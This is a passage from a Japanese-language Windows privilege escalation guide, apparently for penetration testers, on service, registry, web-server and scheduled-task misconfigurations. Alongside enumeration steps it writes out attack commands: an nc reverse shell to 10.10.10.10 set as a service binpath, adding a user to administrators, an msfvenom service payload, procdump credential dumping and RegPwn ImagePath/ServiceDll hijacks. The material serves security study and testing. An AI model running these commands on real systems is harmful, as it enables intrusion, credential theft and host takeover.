まず、プロセス一覧を確認し、**プロセスのコマンドラインにパスワードが含まれていないか確認します**。\
**実行中のバイナリを上書きできるか**、またはバイナリのフォルダーへの書き込み権限があるかを確認し、[**DLL Hijacking attacks**](dll-hijacking/index.html) を実行できるか調べます。

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

常に、権限昇格に悪用できる可能性がある[**electron/cef/chromium debuggers**の実行有無](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)を確認してください。

debugger のリスナーは短時間しか稼働しないことがあるため、受動的なポートスナップショットで一度確認できなかったからといって、公開されていなかったとは限りません。観測されたリスナーについて、PID、プロセスの所有者、および権限の低いユーザーからの到達可否を照合してください。アプリケーション名やデバッグフラグだけでは、ユーザー間のコード実行が可能だとは判断できません。通常の列挙では受動的な手法を用い、debugger コマンドは送信しないでください。

**プロセスのバイナリに対する権限の確認**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**プロセスのバイナリがあるフォルダーのアクセス許可を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor ディレクトリ

Snort 2 は、`snort.exe -c <config>` で選択した設定ファイルで宣言されている `dynamicpreprocessor directory` から共有ライブラリを読み込めます。別のアカウントで Snort を実行するスケジュールタスクやサービスについては、その設定ファイルと、宣言されたモジュールディレクトリの ACL を確認してください。自分のトークンでそのディレクトリにファイルを作成できる場合、そのタスクまたはサービスが次にモジュールを読み込む際にコード実行が可能か検討する対象となります。昇格が成立するとは限らないため、実行アカウントの実効権限、アクティブな設定、モジュールの互換性、拒否ルールや共有制限を確認してください。[Snort の dynamic preprocessor に関するドキュメント](https://www.snort.org/documents/dpx-readme)では、実行時のモジュール読み込みについて説明しています。

### 書き込み可能なドキュメントルートを持つ特権 Web サービス

Windows の Apache インストールでは、サービスの実行ファイルパスと実行アカウントを、アクティブな `httpd.conf` 内の `DocumentRoot` と照合してください。一般的な XAMPP の構成では、`C:\xampp\apache\conf\httpd.conf` と、設定されているドキュメントルート（多くの場合 `C:\xampp\htdocs`）の ACL を確認します。Apache が `LocalSystem` として実行されている状態で、低権限ユーザーがそのルートにファイルを作成できる場合、サーバーサイドのコード実行によってホストの権限境界を越えられる可能性があります。サービスが実行中であること、正確なパスが公開されていること、対象のファイル形式がサーバーサイドハンドラーで処理されることを確認してください。ルートへの書き込みが可能なだけでは、ファイルを作成できることしか証明できません。書き込みテストをせずに ACL を確認します。

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

For a conventional WAMP installation, サービスはバージョン付きの `C:\wamp64\bin\apache\apache*\bin\httpd.exe`（32-bit レイアウトの場合は `C:\wamp\...`）を指していることがあります。設定ファイルはその隣の `conf\httpd.conf` にあり、デフォルトのルートは `C:\wamp64\www` または `C:\wamp\www` です。実際のサービスイメージ、実行ユーザー、実効 `DocumentRoot`（`${INSTALL_DIR}` の展開や virtual-host による上書きを含む）、ルートの ACL をまとめて確認してください。WAMP ディレクトリに書き込み可能であることだけでは、Apache が `SYSTEM` として実行されることや、配置したファイルを実行することの証明にはなりません。[Apache のドキュメントでは、Windows サービスが設定を選択する方法が説明されています](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service)。

### 書き込み可能な IIS ルートと application-pool のネットワーク ID

IIS では、`applicationHost.config` を調べ、書き込み可能な物理ディレクトリが**アクティブなサイト／アプリケーション**に割り当てられていることを確認したうえで、設定されている pool とサーバー側 handler を特定してください。配信対象ディレクトリに置いたコードが pool として実行されるのは、IIS がそのファイル形式を処理し、該当ルートにアクセスできる場合に限られます。書き込み可能なディレクトリをコード実行可能と判断する前に、現在のユーザーが実効的にファイルを作成できるか、サイトが稼働中か、handler とパス単位の上書き設定がどうなっているかを確認してください。

ASP.NET の動的コンパイルについては、アプリケーションのコンパイルディレクトリに生成されるファイルも別途確認が必要です。デフォルトでは、該当する .NET Framework インストール配下の `Temporary ASP.NET Files` ディレクトリが使われますが、アプリケーションの `<compilation tempDirectory>` によって変更できます。[Microsoft のドキュメントでは、場所とアプリケーションごとのサブディレクトリについて説明されています](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29)。また、application pool 同士が互いを信頼しない場合に、コンパイルディレクトリを分離することを[推奨しています](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories)。低権限の token で**特定の**アプリケーションの cache 内の生成ソースを変更できる場合は、そのアプリケーションがより高い権限の [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) で再コンパイルするかどうかを確認してください。ファイルやディレクトリの ACL だけではコード実行の証明にはなりません。cache とアクティブなアプリケーション、実効 token と ACL、コンパイル設定、プロセス ID、再コンパイルのタイミングを照合してください。読み取り専用でメタデータを確認し、列挙中にコンパイルを誘発したり cache ファイルを変更したりしないでください。

`ApplicationPoolIdentity` または `NetworkService` として設定された IIS pool は、ローカルの token が低権限であっても、通常は**ホストコンピューターのアカウント**でドメインリソースに認証します。`LocalSystem` はローカルですでに高い権限を持ち、ネットワーク上でもコンピューターアカウントを使用します。一方、`LocalService` は通常、ネットワーク上では匿名の資格情報を提示します。`SpecificUser` の pool は、設定されたアカウントを使用します。[Microsoft のドキュメントでは、これらの ID の種類](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel)と[application-pool のネットワーク ID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)について説明されています。ID の設定が省略されている場合、pool のデフォルト設定を継承することがあります。デフォルトは IIS の世代によって異なるため、pool 名から推測せず、実効設定を確認してください。コード実行がコンピューターアカウントのネットワーク ID を持つ pool に到達する場合は、**該当するコンピューター固有の**ディレクトリ権限を評価してください。[DCSync](../active-directory-methodology/dcsync.md) にはドメイン名前付けコンテキストに対するレプリケーション権限が必要です。マシンアカウントの ticket やホストの役割だけでは、その権限の証明になりません。受動的な列挙では、ファイルのアップロード、ネットワーク認証、ticket の要求を行わずに、設定と ACL を確認してください。

補助プロセスを起動する読み取り可能な ASP.NET handler については、リクエスト由来の値が認証、復号、検証、コマンド構築をどう経由するかを追跡してください。復号した token を `ProcessStartInfo("cmd", "/c ...")` に連結する handler では、shell のメタ文字によってコマンドが変わる可能性があります。[Microsoft のドキュメントでは、`cmd` の特殊文字が説明されています](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)。信頼できない呼び出し元が実際に復号後の値に影響を与えられ、その handler に到達できることを確認したうえで、実効 application-pool ID または偽装された ID と、子プロセスの ID を特定してください。読み取り可能なソースの一行、localhost の listener、token 形式の脆弱性だけでは、特権コマンド実行の証明になりません。受動的な列挙中は、偽造リクエストを送信したり補助プロセスを実行したりせずに、ソースと pool の設定を確認してください。

Windows 上の PHP サービスでは、リクエストで制御可能なパスを [`include` または `require`](https://www.php.net/manual/en/function.include.php) に渡すと、低権限ユーザーが書き込み可能な PHP ファイルが worker の ID で評価される可能性があります。リクエストから該当の処理に到達できること、解決されたパスが低権限ユーザーに変更可能で worker が読み取り可能なファイルを指すこと、適用される PHP のパス制限で include が許可されていること、worker が実際により高い権限で実行されていることを確認してください。loopback listener や書き込み可能なファイルだけでは、この一連の条件が成立する証明にはなりません。受動的な列挙中は endpoint を呼び出さずに、ソース、サービス ID、ファイル ACL を確認してください。

### メモリ上のパスワードの採取

sysinternals の **procdump** を使用して、実行中のプロセスのメモリダンプを作成できます。FTP などのサービスでは、**資格情報がメモリ内に平文で保存されている**ことがあります。メモリをダンプして資格情報を読み取ってみてください。

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### 安全でない GUI アプリ

**SYSTEM として実行されるアプリケーションでは、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: 「Windows ヘルプとサポート」（Windows + F1）で「コマンド プロンプト」を検索し、「クリックしてコマンド プロンプトを開く」をクリックする

### 特権アカウントによるプロジェクトファイルのインポート

低権限ユーザーが書き込めるドロップディレクトリからプロジェクトを自動的に開くアプリケーションは、インポーターのアカウントで入力の信頼境界を越えます。**正確な書き込み可能パス**、それを開くプロセスまたはタスク、その実効 ID、パーサーのビルドを確認してください。[過去の Ghidra のプロジェクトを開く／復元する際の問題](https://github.com/NationalSecurityAgency/ghidra/issues/71)では、プロジェクトメタデータ内の XML 外部エンティティが許可されていました。Windows でネットワークエンティティを使うと、[送信 SMB および NTLM ポリシー](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking)が許可している場合、インポートアカウントから認証が発生する可能性があります。これは認証情報漏えいにつながる手掛かりであり、直ちに管理者アクセスを得られることを意味しません。その応答を利用するには、別の許可された経路または脆弱な経路が必要です。また、現行ビルドについては、実際のパッチ適用状況を確認してください。受動的な列挙中に細工したプロジェクトを開かず、インポートのワークフローと ACL を調べてください。

## サービス

Service Control Manager (SCM) オブジェクトの [`SC_MANAGER_CREATE_SERVICE` 権限](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)は、既存のサービスに対する権限とは別です。この権限を指定した読み取り専用の [`OpenSCManager` アクセス要求](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw)が成功しても、それは調査の手掛かりであり、新しいサービスを実行できる証拠ではありません。[`CreateService` はハンドルを返します](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew)。このハンドルには作成時に要求されたサービスアクセス権が付与されます。後でサービスを再度開く場合は別途アクセスチェックが行われるため、元のハンドルを使えた場合でも失敗することがあります。実効ローカルまたはリモートトークン、付与されたハンドル権限、サービスアカウント、開始ポリシー、実行ファイルのパスをそれぞれ確認してください。受動的な列挙中にサービスを作成または開始しないでください。

リモートからサービスをインストールする経路を調べる場合は、SCM 権限に加え、対象上の共有に**同じネットワークログオン**で書き込めるか、その共有の基盤となる NTFS ACL、そしてサービスアカウントが実行できるローカル実行ファイルのパスを照合してください。SCM 権限が異常に広く、ファイルを配置できる経路も存在する場合は、非管理者アカウントでもこの境界を越えられる可能性があります。管理共有は必須条件ではありません。共有への書き込み権限だけでも、SCM のサービス作成権限を示す手掛かりだけでも、新しいサービスをより高い ID で開始できるとは言えません。

既存のサービスは、起動、シャットダウン、または別のライフサイクルイベントでヘルパー実行ファイルを呼び出す場合があります。そのヘルパーが `ImagePath` に存在しない場合も同様です。ヘルパー名が低権限ユーザーの書き込み可能なディレクトリに解決され、サービスがより高い ID で実行されている場合、欠落したヘルパーファイルは条件付きで置き換え候補になります。**実際のサービスコードまたは文書化されたヘルパーの呼び出し**、解決後の実行ファイルパスと検索順序、ディレクトリの作成権限、サービス ID、利用可能なライフサイクルトリガーを確認してください。サービスディレクトリが書き込み可能であることやファイルが欠落していることだけでは、そのサービスがファイルを読み込むとは言えません。受動的な調査ではサービスを開始または停止しないでください。

既存のサービスでは、[`SERVICE_START` により `StartService` に引数を渡せます](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)。これは [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)とは別の権限です。サービスのコードまたは文書化されたインターフェイスを調べ、開始権限を単なる制御権以上のものとみなせるか確認してください。呼び出し元が選択した引数をログまたはエクスポート先のパスとして使う場合は、サービス ID、引数から書き込みに至るまでの正確な処理、パス制限、**作成されるファイル**の権限を確認してください。保護されたディレクトリへの書き込みが昇格につながるのは、そのファイルを受け入れる別の特権コンシューマーまたはローダーがある場合に限られます。書き込み可能なログや開始権限だけでは不十分です。受動的なインベントリではサービスを開始したり、テストファイルを作成したりしないでください。

NSClient++ 監視エージェントの場合、読み取り可能な `nsclient.ini` は**設定を調査する手掛かり**です。Web 認証情報が含まれる場合があり、`boot.ini` によって設定の参照先が別の場所に変更されている可能性もあります。実際のサービスアカウント、WEB リスナーとアクセス ポリシー、認証済みロールで設定またはスクリプトを変更できるかを確認してください。特権実行にはさらに、`CheckExternalScripts`（または有効になっている別の実行経路）、コマンドを登録または変更する実効権限、それをサービス ID で実行するトリガーが必要です。ループバックのみのリスナーでもローカルユーザーから到達できる場合がありますが、ファイルパス、パスワード、またはリスナーだけでは、そうした権限があるとは言えません。受動的な列挙では、シークレットを表示したり Web API を呼び出したりせずに、メタデータと権限を確認してください。[NSClient++ のファイル構成](https://nsclient.org/docs/concepts/file-layout/)、[Web とスクリプトのセキュリティに関するガイダンス](https://nsclient.org/docs/setup/securing/)、[外部スクリプトの設定](https://nsclient.org/docs/reference/check/CheckExternalScripts/)を参照してください。

`ImagePath` が `nssm.exe` のサービスでは、実際の実行アカウントと `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` の値を確認してください。[NSSM は子アプリケーションをここに保存します](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h)。`AppDirectory` は設定された作業ディレクトリです。ラッパーの権限だけでサービスの境界全体を判断せず、子実行ファイルとその親ディレクトリの ACL を確認してください。その子が公開するローカル WCF または SOAP エンドポイントは、別個の調査の手掛かりです。低権限ユーザーからリスナーに到達できるか、対象の操作がそのユーザーの入力を受け付けるか、サービスの子プロセスがより高い ID で危険な操作を実行するかを確認してください。サービスアカウント、エンドポイント URL、または書き込み可能なパスだけでは、昇格の証拠になりません。受動的な列挙中にサービス操作を呼び出さないでください。

カスタム WCF 操作では、呼び出し元が制御する文字列が PowerShell runspace に渡されるかを追跡してください。[`Pipeline.Commands.AddScript` はスクリプトテキストを追加します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript)。[`Pipeline.Invoke` はパイプラインを実行します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)。[Windows トランスポート資格情報を使用する `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding)はクライアントを認証しますが、**その特定の**操作を呼び出す権限と runspace の実効 ID は別途確認する必要があります。低権限の呼び出し元の入力から、より高いサービス ID で実行される `AddScript` までの経路は、コード実行の境界です。リスニングポート、認証済みクライアント、または無関係なアセンブリにある未使用メソッドだけでは証拠になりません。列挙中にエンドポイントを呼び出さず、デプロイ済みサービス、コントラクト、認可、偽装の設定を静的に確認してください。

Service Triggers を使うと、特定の条件（名前付きパイプ／RPC エンドポイントのアクティビティ、ETW イベント、IP の利用可能状態、デバイスの接続、GPO の更新など）が発生したときに Windows がサービスを開始できます。SERVICE_START 権限がなくても、トリガーを発生させて特権サービスを開始できることがよくあります。列挙とアクティブ化の手法はこちらを参照してください。

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio 診断コレクター サービス

C/C++ ツールを含む Visual Studio のインストールには、`LocalSystem` として実行するよう設定された診断サービス `VSStandardCollectorService150` が含まれる場合があります。[CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/)では、ジャンクションとオブジェクトマネージャーリンクの競合を利用して、サービス DACL のリセット先をリダイレクトしました。実証された昇格には、Visual Studio Setup WMI Provider MSI の修復経路が利用可能であることと、`C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` が対象になることも必要でした。このコンポーネントは 2024 年 1 月に修正されました。

受動的なトリアージでは、そのサービスのアカウントとバイナリパスを調べ、Setup WMI コンパイラのパスが存在するか確認し、インストール済みコンポーネントのパッチ適用状況を確認してください。サービスエントリ、Visual Studio 製品のバージョン、またはコンパイラファイルだけでは、ホストが脆弱であるとは言えません。確認のためにサービスを開始したり、修復を実行したりする必要はありません。

サービスの一覧を取得します:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### アクセス許可

サービスの情報を取得するには **sc** を使用できます

```bash
sc qc <service_name>
```

各サービスに必要な権限レベルを確認するため、_Sysinternals_ のバイナリ **accesschk** を用意しておくことを推奨します。

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

「Authenticated Users」がサービスを変更できるかどうか確認することを推奨します：

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP 用の accesschk.exe はこちらからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

次のエラーが発生する場合（例: SSDPSRV）:

_システム エラー 1058 が発生しました。_\
_サービスは無効になっているか、有効なデバイスが関連付けられていないため、開始できません。_

次の方法で有効にできます。

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**サービス upnphost が動作するには SSDPSRV に依存している点に注意してください（XP SP1 の場合）**

**この問題の別の回避策**は、次を実行することです。

```
sc.exe config usosvc start= auto
```

### **サービスバイナリパスの変更**

「Authenticated users」グループがサービスに対する **SERVICE_ALL_ACCESS** を持つ場合、サービスの実行可能バイナリを変更できます。**sc** を変更して実行するには：

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### サービスを再起動する

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

権限の昇格は、さまざまな権限を通じて可能です。

- **SERVICE_CHANGE_CONFIG**: サービスバイナリの再設定を可能にします。
- **WRITE_DAC**: 権限の再設定を可能にし、サービス設定を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得と権限の再設定を可能にします。
- **GENERIC_WRITE**: サービス設定を変更する権限を継承します。
- **GENERIC_ALL**: サービス設定を変更する権限も継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### サービスバイナリの脆弱な権限

サービスが **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または特権を持つドメインアカウントで実行されていても、**低権限ユーザーがサービス EXE またはその親フォルダーを変更できる場合**、多くの場合、**バイナリを置き換えてサービスを再起動することで**サービスを乗っ取れます。

**サービスが実行するバイナリを変更できるか**、またはバイナリが置かれている**フォルダーへの書き込み権限があるか**を確認してください（[**DLL Hijacking**](dll-hijacking/index.html)**）。**\
**wmic**（system32 にはありません）を使えば、サービスが実行するすべてのバイナリを取得できます。権限は **icacls** で確認してください：

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

**sc** と **icacls** も使用できます:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探します。特に、サービスの実行ファイルまたはその格納ディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実用的な悪用手順は次のとおりです。<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリが書き込み可能か確認します。
3. サービスのバイナリを payload または有効な悪意のあるサービスバイナリに置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または、再起動やサービスのトリガーを待ちます）。

自動チェックに役立つツール：<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> サービスが通常のユーザーによる再起動を許可していない場合は、起動時に自動で開始されるか、失敗時のアクションで再起動されるか、またはそのサービスを使用するアプリケーションによって間接的に起動できるかを確認してください。

### サービスレジストリの変更権限

サービスのレジストリを変更できるか確認してください。\
サービスの**レジストリ**に対する**権限**は、次の方法で**確認**できます。

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

特定のサービスキーに対して、**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が書き込み可能なレジストリ権限を持っているか確認します。ACL エントリがあるだけでは、実効アクセスが可能とは限りません。拒否エントリ、現在のトークン、継承された権限も関係します。レジストリキーの権限は、サービスオブジェクトの `SERVICE_CHANGE_CONFIG` および `SERVICE_START` 権限とは別です。権限昇格にはさらに、利用可能なサービス構成フィールド、サービスを起動する手段、より高い権限を持つサービス ID が必要です。Microsoft の[レジストリキーの権限](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights)および[サービスのアクセス権に関するリファレンス](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)を参照してください。

実行されるバイナリの Path を変更するには:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink raceによる任意のHKLM value write（ATConfig）

一部のWindowsアクセシビリティ機能はユーザーごとの **ATConfig** キーを作成し、後で **SYSTEM** プロセスがそれをHKLMのセッションキーにコピーします。Registry **symbolic link race** により、この特権的な書き込みを**任意のHKLMパス**にリダイレクトでき、任意のHKLM **value write** のプリミティブを得られます。<sup>[[18]](#references)</sup>

主な場所（例：スクリーンキーボード `osk`）：

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みのアクセシビリティ機能が一覧表示されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御できる設定が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は、ログオン／セキュアデスクトップへの遷移時に作成され、ユーザーが書き込み可能です。

悪用の流れ（CVE-2026-24291 / ATConfig）：

1. SYSTEMに書き込ませたい **HKCU ATConfig** の値を設定します。
2. セキュアデスクトップへのコピーをトリガーします（例：**LockWorkstation**）。これによりAT brokerの処理が始まります。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定して **raceに勝ちます**。oplockが発動したら、**HKLM Session ATConfig** キーを保護対象のHKLMターゲットへの **registry link** に置き換えます。
4. SYSTEMが、攻撃者の選んだ値をリダイレクト先のHKLMパスに書き込みます。

任意のHKLM value writeが可能になったら、サービス設定値を上書きしてLPEに移行します。

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE／コマンドライン）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

通常のユーザーが起動できるサービス（例：**`msiserver`**）を選び、書き込み後に起動します。**注：** 公開されているexploitの実装では、raceの一環としてワークステーションをロックします。

ツールの例（RegPwn BOF / standalone）：<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### サービス レジストリの AppendData/AddSubdirectory 権限

レジストリに対してこの権限がある場合、**このレジストリの下にサブレジストリを作成できます**。Windows サービスの場合、**任意のコードを実行するにはこれで十分です**:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルのパスが引用符で囲まれていない場合、Windows はスペースまでの各部分を実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次を実行しようとします:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

組み込みの Windows サービスに属するものを除き、すべての unquoted service paths を列挙します:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**metasploitでこの脆弱性を検出して悪用できます**: `exploit/windows/local/trusted\_service\_path` metasploitを使ってサービスバイナリを手動で作成できます:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### 回復アクション

Windows では、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能は、バイナリを指すように設定できます。そのバイナリを置き換え可能な場合、privilege escalation が可能になることがあります。詳しくは[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## スケジュールされたタスクのスクリプトの実行先

有効なタスクが `.bat` または `.cmd` ファイルを指定して `cmd.exe /c` を実行する場合は、`cmd.exe` だけでなく、**アクションの引数**で指定されているスクリプトも確認してください。PowerShell の `-File` など、インタープリターに明示的なファイル引数を渡す場合も同様です。スケジュールされたバッチファイルに PowerShell の `-File` 呼び出しがリテラルで含まれている場合は、参照先のスクリプトの ACL も調査してください。変数、条件分岐、シェルの連結がある場合は、手動で追跡する必要があります。呼び出し元が書き込み可能なスクリプトまたは親ディレクトリは、設定されたタスクのプリンシパルが呼び出し元と異なり、かつタスクが実際にそのアクションを実行する場合に限り、アカウントをまたいだ実行につながる可能性があります。スクリプトでは追記のみ可能な ACL も問題になることがありますが、それより前に `exit` などの制御フローがあると、追記した行に到達できない場合があります。privilege escalation と判断する前に、実効 ACL、[タスクの実行コンテキスト](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)、作業ディレクトリ、トリガー、アプリケーション制御ポリシーを確認してください。インベントリの作成中にスクリプトを変更したり、タスクを開始したりしないでください。

## アクセス可能なファイル内の名前付きストリーム

NTFS では、読み取り可能なファイルに名前付き `:$DATA` ストリームが含まれていても、通常のディレクトリ一覧には表示されないことがあります。アクセス可能なバックアップファイルや設定ファイルのうち、関連する少数のファイルについて、内容を開く前にストリームの**名前とサイズ**を確認してください。Windows では [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) を通じて、PowerShell では [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) を通じて確認できます。秘密情報を示唆するストリーム名は、あくまで手がかりです。ファイルへの実効的な読み取り権限、ファイルシステムがストリームをサポートしているか、ストリームに利用可能な認証情報が含まれているか、その認証情報が実際にどのアカウントとして認証されるかを確認してください。通常の列挙では、再帰的なストリームのスキャンや、ストリーム内容の表示は避けてください。

## スケジュールされた Windows Driver Kit ヘルパーの入力ファイル

